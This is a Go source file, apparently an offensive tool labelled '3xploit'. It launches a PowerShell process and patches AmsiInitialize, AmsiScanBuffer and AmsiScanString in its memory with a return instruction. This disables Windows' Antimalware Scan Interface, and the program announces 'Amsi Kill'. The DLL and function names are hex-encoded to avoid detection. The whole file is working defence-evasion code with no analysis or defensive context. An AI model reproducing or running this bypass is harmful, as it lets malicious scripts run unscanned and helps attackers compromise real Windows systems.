//3xploit 3/04/2022s

package main

import (
	"AMSI/help"
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"time"
	"unsafe"
)

var (
	oldProtect     uint32
	old            uint32
	patch          = []byte{0xc3}
	startupIF      syscall.StartupInfo
	processI       syscall.ProcessInformation
	e              error
	WP             uintptr
	Adll           = syscall.NewLazyDLL(help.HexToString("616d73692e646c6c"))              //amsi.dll
	AmsiScanBuffer = Adll.NewProc(help.HexToString("416d73695363616e427566666572"))        //AmsiScanBuffer
	AmsiScanString = Adll.NewProc(help.HexToString("416d73695363616e537472696e67"))        //AmsiScanString
	AmsiInitialize = Adll.NewProc(help.HexToString("416d7369496e697469616c697a65"))        //AmsiInitialize
	K32            = syscall.NewLazyDLL(help.HexToString("6b65726e656c33322e646c6c"))      //kernel32.dll
	WPM            = K32.NewProc(help.HexToString("577269746550726f636573734d656d6f7279")) //WriteProcessMemory
)

func main() {

	commad := syscall.StringToUTF16Ptr("powershell -noexit  ")
	help.Log("Creating process: %v", commad)
	err := syscall.CreateProcess(
		nil,
		commad,
		nil,
		nil,
		false,

		windows.CREATE_NEW_CONSOLE,
		nil,
		nil,
		&startupIF,
		&processI)

	fmt.Printf("Return: %d\n", err)

	hProcess := uintptr(processI.Process)
	hThread := uintptr(processI.Thread)
	help.Log("Process created. Process: %v, Thread: %v", hProcess, hThread)

	time.Sleep(3 * time.Second)

	fmt.Println("parchando  amsi ......")

	AM := []uintptr{
		AmsiInitialize.Addr(),
		AmsiScanBuffer.Addr(),
		AmsiScanString.Addr(),
	}

	for _, baseAddr := range AM {
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
		WP, _, e = WPM.Call(hProcess, baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
		if WP == 0 {
			help.Log("WriteProcessMemoryAsAddr[%v : %x]: %v", hProcess, baseAddr, err)
			return
		}
		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
		if e != nil {
			fmt.Println("virtualprotect error")
			fmt.Println(e)
			return
		}
	}

	fmt.Println("Amsi Kill\n")

	help.CloseHandle(hProcess, hThread)

}
